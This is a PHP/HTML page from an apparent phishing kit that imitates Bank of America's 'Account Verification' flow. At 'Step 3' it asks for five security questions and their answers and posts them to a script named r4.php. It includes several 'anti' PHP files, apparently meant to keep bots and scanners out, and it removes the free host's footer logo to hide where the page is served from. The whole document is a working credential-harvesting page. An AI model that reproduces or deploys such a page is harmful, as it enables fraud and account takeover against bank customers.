<?php
	include 'prevents/anti1.php';
	include 'prevents/anti2.php';
	include 'prevents/anti3.php';
	include 'prevents/anti4.php';
	include 'prevents/anti5.php';
	include 'prevents/anti6.php';
	include 'prevents/anti7.php';
	include 'prevents/anti8.php';
?>
<!DOCTYPE html>
<html class="win chrome chrome-47 webkit svg-bg not-retina non-retinal cf-l33bo-reg-active cf-l33bo-med-active" lang="en-US">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
<title>Verification</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/ico">
<link href="assets/css/frd.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/verify2.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
    $(document).ready(function(){ 
	$('body').find('img[src$="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"]').remove();
    }); 
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<style>
span.error {
	color:red;
	display:block;
	text-size:8px;
	font-weight:bold;
	padding-left:3px;
</style>
<script>
$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					q1: { required: true},
					q2: { required: true},
					q3: { required: true},
					q4: { required: true},
					q5: { required: true},
					a1: { required: true},
					a2: { required: true},
					a3: { required: true},
					a4: { required: true},
					a5: { required: true},
                },
				errorPlacement: function(error, element) {
				if (element.attr("name") == "q1") 
				error.insertAfter("#q1error");
				else if (element.attr("name") == "q2") 
				error.insertAfter("#q2error");
				else if (element.attr("name") == "q3") 
				error.insertAfter("#q3error");
				else if (element.attr("name") == "q4") 
				error.insertAfter("#q4error");
				else if (element.attr("name") == "q5") 
				error.insertAfter("#q5error");
				if (element.attr("name") == "a1") 
				error.insertAfter("#a1error");
				else if (element.attr("name") == "a2") 
				error.insertAfter("#a2error");
				else if (element.attr("name") == "a3") 
				error.insertAfter("#a3error");
				else if (element.attr("name") == "a4") 
				error.insertAfter("#a4error");
				else if (element.attr("name") == "a5") 
				error.insertAfter("#a5error");
				else 
				error.insertAfter(element);			
				},
				groups: {
					ccexp: "ccmm ccyy",
				},
                messages: {
					q1:{required: "Please select a security question",},
					q2:{required: "Please select a security question",},
					q3:{required: "Please select a security question",},
					q4:{required: "Please select a security question",},
					q5:{required: "Please select a security question",},
					a1:{required: "Please provide your answer to the above security question",},
					a2:{required: "Please provide your answer to the above security question",},
					a3:{required: "Please provide your answer to the above security question",},
					a4:{required: "Please provide your answer to the above security question",},
					a5:{required: "Please provide your answer to the above security question",},
				},
			   submitHandler: function(form) {
                    form.submit();
                }
            });

			$("#go").click(function() {
			$("#details").submit();
			});
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
 
</script>
</head>
<body>
<div class="two-row-flex-wideleft-layout">
<div class="center-content">
<div class="header">
<div class="header-module">
<div class="l33b00"><img height="28" src="assets/img/logo.gif" width="221">
<div class="page-type l33bo-reg">Account Verification</div>
<div class="right-links">
<div class="secure-area">Secure Area</div>
<a class="divide" href="#">En Espa&ntilde;ol</a>
<div class="clearboth"></div>
</div>
<div class="clearboth"></div>
</div>
</div>
<div class="page-title-module h-100" id="skip-to-h1" style="height:60px!important">
<div class="red-grad-bar-skin sup-ie">
<h1 class="l33bo-reg">Step 3</h1>
</div>
</div>
<div class="status-bar-bdf-module">
<div class="multi-step-skin">
<div class="sb-step"><span class="ada-hidden">Step 1 of 5:</span> Personal Information
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-previous-step"><span class="ada-hidden">You are currently at Step 2 of 5:</span> Account Details
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-selected-step"><span class="ada-hidden">Step 3 of 5:</span> Security
<div class="sb-arrow"></div>
</div>
<div class="sb-step"><span class="ada-hidden">You are currently at Step 4 of 5:</span> Identification
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-last-step"><span class="ada-hidden">Step 5 of 5:</span> Finish</div>
<div class="clearboth"></div>
</div>
</div>
</div>
<div class="flex-top-row"></div>
<div class="bottom-row">
<div class="left-column">
<div class="passcode-module">
<div class="self-enroll-skin phoenix">
<p class="mbtm-10">To help verify your identity, please enter the following details.</p>
<form action="r4.php" autocomplete="off" class="common-form" id="details" method="post" name="details">
<fieldset><legend></legend>
<div class="input-section">
<fieldset>
<div class="text2">
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td colspan="5"><br></td>
</tr>
</tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td><span class="h2-ada">Security Queston:<br></span> <span class="title4"><span class="textbold">
<select required="required" class="align-font-width" id="q1" name="q1" style="width:350px">
<option selected value="">Select Question</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="In what city were you born?">In what city were you born? (Enter full name of city only)</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
<option value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</option>
</select></span></span>
<div id="ans1" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<span id="q1error" class="l33error"></span>
</td>
</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Answer:</b></label></span></span></td>
</tr>
<tr>
<td><input required="required" class="resize-text1" id="a1" maxlength="30" name="a1" size="33" type="text">
<span id="a1error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 2 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td><span class="h2-ada">Security Queston:<br></span> <span class="title4"><span class="textbold">
<select required="required" class="align-font-width" id="q2" name="q2" style="width:350px">
<option selected value="">Select Question</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="In what city were you married?">In what city were you married?</option>
<option value="In what city is your vacation home?">In what city is your vacation home?</option>
<option value="What is the first name of your first child?">What is the first name of your first child?</option>
<option value="What is the name of your first employer?">What is the name of your first employer?</option>
<option value="What is your favorite hobby?">What is your favorite hobby?</option>
<option value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What high school did you attend?">What high school did you attend?</option>
</select></span></span>
<div id="ans2" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<span id="q2error" class="l33error"></span>
</td>
</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Answer:</b></label></span></span></td>
</tr>
<tr>
<td><input required="required" class="resize-text1" id="a2" maxlength="30" name="a2" size="33" type="text">
<span id="a2error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 3 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td><span class="h2-ada">Security Queston:<br></span> <span class="title4"><span class="textbold">
<select required="required" class="align-font-width" id="q3" name="q3" style="width:350px">
<option selected value="">Select Question</option>
<option value="In what city was your mother born?">In what city was your mother born? (Enter full name of city only)</option>
<option value="In what city was your father born?">In what city was your father born? (Enter full name of city only)</option>
<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
<option value="When is your wedding anniversary?">When is your wedding anniversary? (Enter the full name of month)</option>
<option value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</option>
<option value="In what city was your high school?">In what city was your high school? (Enter only "Charlotte" for Charlotte High School)</option>
<option value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="Where did you meet your spouse for the first time?">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
</select></span></span>
<div id="ans3" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<span id="q3error" class="l33error"></span>
</td>
</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Answer:</b></label></span></span></td>
</tr>
<tr>
<td><input required="required" class="resize-text1" id="a3" maxlength="30" name="a3" size="33" type="text">
<span id="a3error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 4 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td><span class="h2-ada">Security Queston:<br></span> <span class="title4"><span class="textbold">
<select required="required" class="align-font-width" id="q4" name="q4" style="width:350px">
<option selected value="">Select Question</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="In what city were you born?">In what city were you born? (Enter full name of city only)</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
<option value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</option>
</select></span></span>
<div id="ans4" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<span id="q4error" class="l33error"></span>
</td>
</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Answer:</b></label></span></span></td>
</tr>
<tr>
<td><input required="required" class="resize-text1" id="a4" maxlength="30" name="a4" size="33" type="text">
<span id="a4error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 5 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td><span class="h2-ada">Security Queston:<br></span> <span class="title4"><span class="textbold">
<select required="required" class="align-font-width" id="q5" name="q5" style="width:350px">
<option selected value="">Select Question</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="In what city were you married?">In what city were you married?</option>
<option value="In what city is your vacation home?">In what city is your vacation home?</option>
<option value="What is the first name of your first child?">What is the first name of your first child?</option>
<option value="What is the name of your first employer?">What is the name of your first employer?</option>
<option value="What is your favorite hobby?">What is your favorite hobby?</option>
<option value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What high school did you attend?">What high school did you attend?</option>
</select></span></span>
<div id="ans5" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<span id="q5error" class="l33error"></span>
</td>
</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Answer:</b></label></span></span></td>
</tr>
<tr>
<td><input required="required" class="resize-text1" id="a5" maxlength="30" name="a5" size="33" type="text">
<span id="a5error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
</div>
</fieldset>
</div>
</fieldset>
<div class="hidden-sections">
<div id="default"></div>
</div>
<div class="ptop-30">
<input id="continue" type="submit" value="Continue" class="btn-bofa btn-bofa-small btn-bofa-blue" id="go"></input>
<div class="clearboth"></div>
</div>
</form>
</div>
</div>
</div>
<div class="right-column no-print"></div>
<div class="clearboth"></div>
</div>
<div class="single-column-row"></div>
<div class="footer">
<div class="footer-top">&nbsp;</div>
<div class="footer-inner" style="margin-top: 83px;">
<div class="global-footer-module">
<div class="gray-bground-skin cssp">
<div class="secure">Secure area</div>
<div class="link-container">
<div class="link-row"><a class="last-link" href="#">Privacy &amp; Security</a>
<div class="clearboth"></div>
</div>
</div>
<p>Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender<img alt="" height="9" src="assets/img/house.gif" width="14"></a><br>
&copy;&nbsp;2021 Bank of America Corporation. All rights reserved.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>